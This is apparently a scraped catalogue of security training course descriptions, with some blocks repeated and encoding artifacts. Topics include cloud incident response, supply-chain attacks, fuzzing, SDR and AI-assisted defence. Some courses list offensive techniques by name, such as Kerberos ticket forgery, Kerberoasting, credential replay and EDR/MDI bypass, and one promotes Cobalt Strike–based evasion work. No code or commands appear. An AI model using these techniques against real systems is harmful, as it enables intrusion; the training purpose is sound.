<font size=""+1""><strong>Description:</strong></font><br>
<p>This hands-on two-day training offers a comprehensive guide to incident response in the Microsoft cloud, covering various topics essential for handling threats and attacks. The course starts with an overview of the concepts of the Microsoft cloud that are relevant for incident response. Participants will learn how to scope an incident in the Microsoft cloud and how to leverage it to set up an incident response capability. On the first day you will be immersed in the world of Azure attacks, we cover the different phases of an attack focusing on the evidence an attack leaves and how you can identify attacks based on the available evidence. On the second day we will shift our focus to Microsoft 365. The training covers the different types of evidence available in a Microsoft 365 environment. Participants will gain an understanding of how to acquire data from a Microsoft 365 environment using multiple methods and tools, and how to parse, enrich, and analyze the Microsoft 365 Unified Audit Log (UAL). The best part of the training is that everything you learn you'll apply with hands-on labs in a CTF like environment. Additionally we have created two full attack scenarios in both Azure &amp; M365 and you're tasked in the CTF to solve as many pieces of the puzzle as you can.</p>

<p>Korstiaan Stam is the Founder and CEO of Invictus Incident Response &amp; SANS Trainer - FOR509: Cloud Forensics and Incident Response. Korstiaan is a passionate incident responder, preferably in the cloud. He developed and contributed to many open-source tools related to cloud incident response. Korstiaan has gained a lot of knowledge and skills over the years which he is keen to share.  </p>

<p>Way before the cloud became a hot topic, Korstiaan was already researching it from a forensics perspective. âBecause I took this approach I have an advantage, because I simply spent more time in the cloud than others. More so, because I have my own IR consultancy company, I spent a lot of time in the cloud investigating malicious behavior, so I donât just know one cloud platform, but I have knowledge about all of them.â That equips him to help students with the challenge of every cloud working slightly or completely different. âIf you understand the main concepts, you can then see that thereâs also a similarity among all the clouds. That is why I start with the big picture in my classes and then zoom in on the details. Korstiaan also uses real-life examples from his work to discuss challenges heâs faced with students to relate with their day-to-day work. âTo me, teaching not only means sharing my knowledge on a topic, but also applying real-life implications of that knowledge. I always try to combine the theory with the everyday practice so students can see why itâs important to understand certain concepts and how the newly founded knowledge can be applied.â</p>

<p>In today's interconnected world, software development relies heavily on third-party components---up to 80% of your code could come from external sources. This reliance creates a complex web of dependencies, making your software supply chain a prime target for cybercriminals. Securing it is no longer optional; it's essential.</p>

<p>This hands-on course takes a comprehensive approach to attacking and securing the software supply chain. In the first section, you'll assume the role of a sophisticated attacker, infiltrating an enterprise through its supply chain partners. You'll learn how to compromise developer laptops, code repositories, CI/CD pipelines, internal registries, and even production environments. Once you've seen how vulnerabilities can be exploited, we'll pivot to defense.</p>

<p>In the second section, we'll build and secure a GitHub organization, configure repositories, and implement best practices to mitigate risks. You'll learn how to secure IaC (Infrastructure as Code) assets, validate third-party code, and remediate vulnerabilities to ensure end-to-end protection.</p>

<p>Through practical exercises, you'll apply these strategies to safeguard your developer environments, CI/CD pipelines, and production systems. By the end of the course, you'll have the knowledge and tools to turn your software supply chain into a security strength rather than a liability.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Fuzzing is a technique of identifying software vulnerabilities by automated corpus generation. It has produced immense results and attracted a lot of visibility from security researchers and professionals in the industry, today fuzzing can be utilized in various ways which can be incorporated into your secure SDLC to discover vulnerabilities in advance and fix them. Attendees will be emulating techniques which will provide a comprehensive understanding of ""Crash, Detect &amp; Triage"" of fuzzed binaries or software. In ""Deep dive into fuzzing"" we will be covering a detailed overview of fuzzing and how it can be beneficial to professionals in uncovering security vulnerabilities with a hands-on approach through focus on labs.</p>

<p>Finding vulnerabilities in software requires in-depth knowledge of different technology stacks. Modern day softwares have a huge codebase and may contain vulnerabilities, manually verifying such vulnerabilities is a tedious task and may not be possible in all cases. This training is designed in such a way that it introduces the concept of fuzzing and vulnerability discovery in softwareâs covering multiple platforms such as Linux &amp; Windows and triage analysis for those vulnerabilities.</p>

<p>Dive deep into cutting edge techniques that bypass or neuter modern endpoint defenses. Learn how these solutions work to mitigate their utility and hide deep within code on the endpoint. The days of downloading that binary from the internet and pointing it at a remote machine are over. Todayâs defenses oftentimes call for multiple bypasses within a single piece of code. </p>

<p>This course is designed to take you deep into defensive and offensive tooling â an apex attacker must know the own indicators of compromise (IOCs) theyâre creating and the artifacts theyâre leaving behind.</p>

<p>Imagine, you are a novice red teamer and you have been tasked with leading a 16-week full-scope red team engagement against a highly mature Fortune 50 company. No, Metapsloit and Mimikatz are not going to work. Do you take your ball and go home? Nope, it's time to build a lab and see what is going to bypass their tech stack.</p>

<p>Do you phish from the external? Maybe an illicit consent grant in Azure? What loader do I use? Is process injection even going to be necessary?  Stop being lost in the offensive cyber sauce; get informed and get to work. WKL's flagship course, Offensive Development, is meant to prepare red teamers and blue teamers for the present day cyberwar. These are not last year's TTPs, WKL will be teaching hyper-current tools and techniques that are being used in current red team operations. </p>

<p>The Offensive Development course is not focused on theory, students will be given a Terraform script that spins up their own isolated AWS lab environment that has several fully patched Windows virtual machines that have various EDR products installed and a fully licensed version of the Cobalt Strike C2 framework.</p>

<p>The pace of finding new offensive cyber techniques that bypass modern detection moves slightly faster than the defense can handle. This course will help red teamers and blue teamers understand the current state of the red/blue war and where the community is heading next, the kernel.</p>

<p>Your lab environment is yours to keep continuing honing your skills. Although the EDR and Cobalt Strike licenses will expire, and the Earth may turn to dust, your AWS lab environment will live forever.  </p>

<p>Although the OD course comes with Cobalt Strike, students are free to install whichever C2 framework they're most comfortable with. Students will receive an additional Ubuntu workstation in their lab environment to install whatever additional tooling they feel is necessary.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Hackers have a unique perspective on the world and in particular on the technological artifacts within it. When most people look at a high tech system, they see what they were meant to see by the people who created it. Hackers see technology as it truly is, not as it was meant to be, and this way of looking at things enables hackers to discover possibilities that were never intended in the first place.</p>

<p>For centuries, military and intelligence strategists have sought to view the world from a similar perspective - a perspective that can see the hidden possibilities and weaknesses in things and take advantage of them to create unexpected results. </p>

<p>This unique course draws lessons from both the hacker community and from military thinking in order to deepen your ability to understand adversaries and see things the way that adversaries see them. </p>

<p>Honing this skill is particularly valuable for people who are building technological systems that might be subject to misuse and need to be able to anticipate that misuse. Whether you are an aspiring red teamer, a hardware engineer, software developer or product owner striving to understand how your product will be abused, or you work in fraud detection, risk analysis, election security, or any other domain where you face an adversary, youâll find this course a valuable addition to your skill set.</p>

<p>We willâ¦</p>

<ul>
<li>Survey adversarial thinking in a wide range of domains</li>
<li>Review the history of hacking and phone phreaking and understand how they influenced the development of a way of thinking about technology</li>
<li>Explore lock picking and physical security</li>
<li>Iteratively decompose an organization or complex system to find its most critical dependencies and develop methods of attacking those dependencies successfully</li>
<li>Consider how one might creatively steal from your employer and what controls are necessary to prevent this from happening</li>
<li>Examine how and why you might be targeted by foreign intelligence </li>
<li>Practice cheating on a test</li>
<li>Understand how the mental models we develop for how things work can prevent us from seeing how they actually work</li>
<li>See how levels of abstraction in computer technology can hide vulnerabilities</li>
<li>Learn how to read technical standards and see the things that they fail to say</li>
<li>Practice fooling your customers by offering products with unstated capabilities</li>
<li>Explore how state cyber operations are organized and could target your organization</li>
<li>Study the crowdsourcing of adversaries, as seen in Ukraine</li>
<li>Explore dangerous security assumptions</li>
<li>Investigate deception techniques</li>
<li>Practice detecting and role-playing insider threats</li>
<li>And much moreâ¦</li>
</ul>

<p>After completing the course youâll leave with:</p>

<ul>
<li>An improved offensive mindset and ability to identify weaknesses and other unintended characteristics of systems.</li>
<li>Heightened awareness of non-obvious threats and threat actors across the spectrum of the cyber, information, cognitive, and physical domains. </li>
<li>Practical tools and techniques to better assess security risk and employ security controls.</li>
<li>A deeper understanding of threat actor TTPs and countermeasures in areas such as: state-level cyberspace operations, electronic warfare and surveillance, supply chain compromise, hardware implants, deception operations, human intelligence collection, physical security, influence operations, targeting methodologies, and novel threat intelligence analytic techniques, among numerous other topics.</li>
<li>Improved critical thinking techniques via an understanding of how the world, its threat actors, and the enterprise security environment behave in practice, not how defenders assume it to be.</li>
<li>An enhanced ability to fluidly shift from the mindset of a defender into that of an attacker, and back again.</li>
<li>Diverse sources of additional information to aid participantsâ continued self-development.</li>
</ul>

<p>This interesting and fast-moving class will include hands-on exercises to apply and reinforce the skills learned. Youâll leave this course with a fresh perspective and a toolkit of techniques to better accomplish your mission. Come join us.</p>

<p>Fuzzing is a technique of identifying software vulnerabilities by automated corpus generation. It has produced immense results and attracted a lot of visibility from security researchers and professionals in the industry, today fuzzing can be utilized in various ways which can be incorporated into your secure SDLC to discover vulnerabilities in advance and fix them. Attendees will be emulating techniques which will provide a comprehensive understanding of ""Crash, Detect &amp; Triage"" of fuzzed binaries or software. In ""Deep dive into fuzzing"" we will be covering a detailed overview of fuzzing and how it can be beneficial to professionals in uncovering security vulnerabilities with a hands-on approach through focus on labs.</p>

<p>Finding vulnerabilities in software requires in-depth knowledge of different technology stacks. Modern day softwares have a huge codebase and may contain vulnerabilities, manually verifying such vulnerabilities is a tedious task and may not be possible in all cases. This training is designed in such a way that it introduces the concept of fuzzing and vulnerability discovery in softwareâs covering multiple platforms such as Linux &amp; Windows and triage analysis for those vulnerabilities.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Dive deep into cutting edge techniques that bypass or neuter modern endpoint defenses. Learn how these solutions work to mitigate their utility and hide deep within code on the endpoint. The days of downloading that binary from the internet and pointing it at a remote machine are over. Todayâs defenses oftentimes call for multiple bypasses within a single piece of code. </p>

<p>This course is designed to take you deep into defensive and offensive tooling â an apex attacker must know the own indicators of compromise (IOCs) theyâre creating and the artifacts theyâre leaving behind.</p>

<p>Imagine, you are a novice red teamer and you have been tasked with leading a 16-week full-scope red team engagement against a highly mature Fortune 50 company. No, Metapsloit and Mimikatz are not going to work. Do you take your ball and go home? Nope, it's time to build a lab and see what is going to bypass their tech stack.</p>

<p>Do you phish from the external? Maybe an illicit consent grant in Azure? What loader do I use? Is process injection even going to be necessary?  Stop being lost in the offensive cyber sauce; get informed and get to work. WKL's flagship course, Offensive Development, is meant to prepare red teamers and blue teamers for the present day cyberwar. These are not last year's TTPs, WKL will be teaching hyper-current tools and techniques that are being used in current red team operations. </p>

<p>The Offensive Development course is not focused on theory, students will be given a Terraform script that spins up their own isolated AWS lab environment that has several fully patched Windows virtual machines that have various EDR products installed and a fully licensed version of the Cobalt Strike C2 framework.</p>

<p>The pace of finding new offensive cyber techniques that bypass modern detection moves slightly faster than the defense can handle. This course will help red teamers and blue teamers understand the current state of the red/blue war and where the community is heading next, the kernel.</p>

<p>Your lab environment is yours to keep continuing honing your skills. Although the EDR and Cobalt Strike licenses will expire, and the Earth may turn to dust, your AWS lab environment will live forever.  </p>

<p>Although the OD course comes with Cobalt Strike, students are free to install whichever C2 framework they're most comfortable with. Students will receive an additional Ubuntu workstation in their lab environment to install whatever additional tooling they feel is necessary.</p>

<p>In today's interconnected world, software development relies heavily on third-party components---up to 80% of your code could come from external sources. This reliance creates a complex web of dependencies, making your software supply chain a prime target for cybercriminals. Securing it is no longer optional; it's essential.</p>

<p>This hands-on course takes a comprehensive approach to attacking and securing the software supply chain. In the first section, you'll assume the role of a sophisticated attacker, infiltrating an enterprise through its supply chain partners. You'll learn how to compromise developer laptops, code repositories, CI/CD pipelines, internal registries, and even production environments. Once you've seen how vulnerabilities can be exploited, we'll pivot to defense.</p>

<p>In the second section, we'll build and secure a GitHub organization, configure repositories, and implement best practices to mitigate risks. You'll learn how to secure IaC (Infrastructure as Code) assets, validate third-party code, and remediate vulnerabilities to ensure end-to-end protection.</p>

<p>Through practical exercises, you'll apply these strategies to safeguard your developer environments, CI/CD pipelines, and production systems. By the end of the course, you'll have the knowledge and tools to turn your software supply chain into a security strength rather than a liability.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>More than 95% of Fortune 500 companies use Active Directory! Enterprises are managed using Active Directory (AD) and it often forms the backbone of the complete enterprise network. Therefore, to secure an enterprise from an adversary, it is inevitable to secure its AD environment. To secure AD, you must understand different techniques and attacks used by adversaries against it. Often burdened with maintaining backward compatibility and interoperability with a variety of products, AD environments lack ability to tackle latest threats.</p>

<p>This training is aimed towards attacking modern AD with focus on OPSEC and Stealth. The training is based on real world penetration tests and Red Team engagements for highly secured environments.  Some of the techniques used in the course:</p>

<ul>
<li>Introduction to OPSEC and Stealth used in the class.</li>
<li>Offensive .NET and PowerShell tradecraft</li>
<li>Extensive AD Enumeration</li>
<li>Active Directory trust mapping and abuse.</li>
<li>Privilege Escalation (User Hunting, Delegation issues, LAPS abuse, gMSA abuse, SPN Hijacking, Shadow Credentials and more)</li>
<li>Advanced Kerberos Attacks and Defense (Diamond, Golden, Silver ticket, Kerberoast and more)</li>
<li>Advanced cross forest trust abuse (Lateral movement across forest, PrivEsc and more)</li>
<li>Credentials Replay Attacks (Over-PTH, Token Replay, Certificate Replay etc.)</li>
<li>Attacking Entra ID integration (Hybrid Identity)</li>
<li>Abusing trusts for MS products (AD CS, SQL Server etc.)</li>
<li>Persistence (WMI, GPO, Domain and Host ACLs and more)</li>
<li>Monitoring Active Directory</li>
<li>Defenses (JEA, PAW, LAPS, Selective Authentication, Deception, App Allowlisting, MDE EDR, Microsoft Defender for Identity etc.)</li>
<li>Bypassing defenses (MDE, MDI and Elastic)</li>

<font size=""+1""><strong>Description:</strong></font><br>
<p>This hands-on two-day training offers a comprehensive guide to incident response in the Microsoft cloud, covering various topics essential for handling threats and attacks. The course starts with an overview of the concepts of the Microsoft cloud that are relevant for incident response. Participants will learn how to scope an incident in the Microsoft cloud and how to leverage it to set up an incident response capability. On the first day you will be immersed in the world of Azure attacks, we cover the different phases of an attack focusing on the evidence an attack leaves and how you can identify attacks based on the available evidence. On the second day we will shift our focus to Microsoft 365. The training covers the different types of evidence available in a Microsoft 365 environment. Participants will gain an understanding of how to acquire data from a Microsoft 365 environment using multiple methods and tools, and how to parse, enrich, and analyze the Microsoft 365 Unified Audit Log (UAL). The best part of the training is that everything you learn you'll apply with hands-on labs in a CTF like environment. Additionally we have created two full attack scenarios in both Azure &amp; M365 and you're tasked in the CTF to solve as many pieces of the puzzle as you can.</p>

<p>Korstiaan Stam is the Founder and CEO of Invictus Incident Response &amp; SANS Trainer - FOR509: Cloud Forensics and Incident Response. Korstiaan is a passionate incident responder, preferably in the cloud. He developed and contributed to many open-source tools related to cloud incident response. Korstiaan has gained a lot of knowledge and skills over the years which he is keen to share.  </p>

<p>Way before the cloud became a hot topic, Korstiaan was already researching it from a forensics perspective. âBecause I took this approach I have an advantage, because I simply spent more time in the cloud than others. More so, because I have my own IR consultancy company, I spent a lot of time in the cloud investigating malicious behavior, so I donât just know one cloud platform, but I have knowledge about all of them.â That equips him to help students with the challenge of every cloud working slightly or completely different. âIf you understand the main concepts, you can then see that thereâs also a similarity among all the clouds. That is why I start with the big picture in my classes and then zoom in on the details. Korstiaan also uses real-life examples from his work to discuss challenges heâs faced with students to relate with their day-to-day work. âTo me, teaching not only means sharing my knowledge on a topic, but also applying real-life implications of that knowledge. I always try to combine the theory with the everyday practice so students can see why itâs important to understand certain concepts and how the newly founded knowledge can be applied.â</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Software Defined Radios (SDRs) are a powerful tool that has made the once-obfuscated domain of the electromagnetic spectrum open to anyone with a low-cost laptop and radio. From both an offensive and defensive perspective, an enormous attack surface, with many legacy devices and protocols, is open for exploitation. SDR 101 is a course designed for cyber security professionals of all skill levels who want to start working with RF signals and SDRs.</p>

<p>This class is a beginner's introduction to practical Software Defined Radio applications and development with an emphasis on hands-on learning. If you have ever been curious about the invisible world of radio waves and signals all around you, but didn't know where to begin, then this course is for you. Students can expect to learn about basic RF theory and SDR architecture before moving on to hands-on development with real radios. Over the two-day course, the instructor will guide students through progressively more complicated RF concepts and waveforms, culminating in a small capstone exercise. Students will be provided with a HackRF SDR for the duration of the class but will need to bring their own laptop to interface with the radio. VMs will be made available to students to download before class, along with an OS setup guide for those that prefer a bare-metal install. The VM/OS will have all the required drivers and frameworks to interface with the radio hardware, allowing us to jump right into hands-on exercises. My intent for this course is to lower the barrier of entry associated with RF hacking and give beginning students a practical understanding of RF and DSP applications with SDRs.</p>

<font size=""+1""><strong>SpeakerBio:</strong></font>&nbsp;&nbsp;Richard Shmel<br>
<p>Richard Shmel is an experienced research and development engineer focusing on radio communications and digital signals processing applications. He has over a decade of experience as an RF engineer and embedded software developer working on prototype radio systems and DSP frameworks. Disappointed by the lack of introductory SDR material he could give to new engineers, he decided to write his own training courses to help fill the gap. Richard has had the privilege of teaching SDR workshops and training at various local and national cyber security conferences - including DEF CON - for many years now. He is passionate about teaching RF/DSP and wireless technology, and will happily talk for hours on the subject if given the chance. Learn more at https://www.rnstechsolutions.com/.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Since our sold out class in 2024, we have refreshed the material to incorporate not only Agentic AI but Content Augmentation Generation (CAG)!</p>

<p>Have you ever wondered how the pros use AI to solve their complex cybersecurity problems? Come find out!</p>

<p>Artificial Intelligence (AI) and Large Language Models (LLMs) have emerged as robust and powerful tools that have redefined how many approach problem solving. The last few years have seen industry AI interest surge while Cybersecurity experts struggle not only to threat model LLMs but to leverage them effectively. Our training presents a comprehensive educational framework aimed at equipping students with the necessary skills to not only build their own LLM toolkits but to leverage AI and LLMs to build elegant solution to solve complex problems unique to their own environments.</p>

<p>This class will teach students how to build their own AI frameworks to ingest data from either SaaS or on-prem data lakes. We will provide both the tools for data data consumption but as well as data warehousing. From there we will walk students through transforming this data and making it operationally effective and efficient for their AI. We will cover various types of data common to Cybersecurity environments, protentional issues with certain data types, and how to make the most of opensource to help transform the data. We will also touch on training and LoRA for model customization.</p>

<p>As Cybersecurity experts, we also need to understand the risk that comes with the use of AI. For this purpose, we will discuss foundational knowledge to conduct both red and blue team exercises regarding AI. We will discuss risk analysis of the disparate components used to make AI functional, a holistic and functional approach to defending the supply chain, understanding vulnerability analysis, and modern day adversary attacks and techniques that you will encounter. Understanding modern security policy frameworks is just as important and we will cover a few of the popular frameworks used to secure and apply policy to your AI environment. We will cap this section of class off with a practicum of both attacking and defending our AI deployed in class.</p>

<p>Using the tools created in class, we will use the SOCMAN DEF CON model to solve hand-picked operational problems we have seen teams struggle with all over the world. You will learn how to use LLMs with agentic AI, how to augment our queries with our own data in two different methods (RAG/CAG), generate high quality YARA/SIGMA rules using your own data, tune your model to hunt complex patterns, improve application observability by adding context to ""weird"" behavior, how to hunt for APTs using real world scenarios and logs (Stuxnet), filter out noise to increase signal in your environment (SNR), and much more! All of these labs will be performed by students and will leverage AI as middleware to add contextual data between disparate platforms to solve your complex cybersecurity problems. All use cases will be performed by students live and in-class.</p>

<p>By the end of this training you will be able to:</p>

<ul>
<li>Build their own AI-powered cybersecurity framework, including custom tooling, ingestion pipelines, and LLM orchestration</li>
<li>Ingest and warehouse data from SaaS and on-prem sources, transforming it for AI readiness using open-source tools</li>
<li>Apply Agentic AI and Content Augmentation Generation (CAG) to real-world cybersecurity challenges</li>
<li>Select, train, and fine-tune models, including LoRA customization for environment-specific detection and automation</li>
<li>Generate high-quality YARA and SIGMA rules using real-world data and AI-assisted pattern matching</li>
<li>Augment detection logic using RAG/CAG, enhancing context-awareness and improving incident triage</li>
<li>Understand foundational knowledge to defend your AI deployments, including threat modeling, adversary simulation, and defending AI infrastructure</li>
<li>Analyze and enrich logs using AI, identify complex behavioral patterns, and detect APT activity using real-world examples like Stuxnet</li>
<li>Improve observability by adding AI-generated context to anomalous or hard-to-interpret behaviors</li>
<li>Increase signal-to-noise ratio (SNR) by using AI to reduce false positives and highlight meaningful security events</li>
<li>Solve complex cybersecurity problems!</li>
</ul>
